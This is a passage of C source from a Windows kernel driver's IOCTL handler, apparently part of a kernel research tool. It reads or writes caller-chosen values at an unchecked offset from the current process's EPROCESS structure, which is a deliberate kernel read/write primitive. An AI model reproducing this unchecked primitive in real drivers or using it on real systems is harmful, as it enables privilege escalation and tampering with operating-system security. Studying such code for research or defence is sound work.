                PKERNEL_RW_EPROCESS_OUTPUT pOut = (PKERNEL_RW_EPROCESS_OUTPUT)outputBuffer;
                PEPROCESS pEProcess = PsGetCurrentProcess();

                if (!pEProcess) {
                    status = STATUS_UNSUCCESSFUL;
                    break;
                }

                UCHAR op = pIn->Operation & 1;
                UCHAR sizeCode = (pIn->Operation >> 1) & 3;
                ULONG size = 0;
                NTSTATUS opStatus = STATUS_SUCCESS;
                UINT64 result = 0;

                switch (sizeCode) {
                    case R0SKRE_SIZE_1: size = 1; break;
                    case R0SKRE_SIZE_2: size = 2; break;
                    case R0SKRE_SIZE_4: size = 4; break;
                    case R0SKRE_SIZE_8: size = 8; break;
                    default:
                        opStatus = STATUS_INVALID_PARAMETER;
                        break;
                }

                if (!NT_SUCCESS(opStatus)) {
                    pOut->Status = opStatus;
                    pOut->ReturnValue = 0;
                    info = sizeof(KERNEL_RW_EPROCESS_OUTPUT);
                    status = opStatus;
                    break;
                }

                PVOID target = (PUCHAR)pEProcess + pIn->Offset;
                __try {
                    if (op == R0SKRE_OP_READ) {
                        switch (size) {
                            case 1: result = *(PUCHAR)target; break;
                            case 2: result = *(PUSHORT)target; break;
                            case 4: result = *(PULONG)target; break;
                            case 8: result = *(PULONG64)target; break;
                        }
                    } else {
                        UINT64 val = pIn->Value;
                        switch (size) {
                            case 1: *(PUCHAR)target = (UCHAR)val; break;
                            case 2: *(PUSHORT)target = (USHORT)val; break;
                            case 4: *(PULONG)target = (ULONG)val; break;
                            case 8: *(PULONG64)target = val; break;
                        }
                        result = 0;
                    }
                } __except (EXCEPTION_EXECUTE_HANDLER) {
                    opStatus = GetExceptionCode();
                }

                pOut->Status = opStatus;
                pOut->ReturnValue = result;
                info = sizeof(KERNEL_RW_EPROCESS_OUTPUT);
                status = opStatus;
            } __except (EXCEPTION_EXECUTE_HANDLER) {
                status = GetExceptionCode();
            }
            break;
        }

        default:
            status = STATUS_INVALID_DEVICE_REQUEST;
            break;
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = info;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}
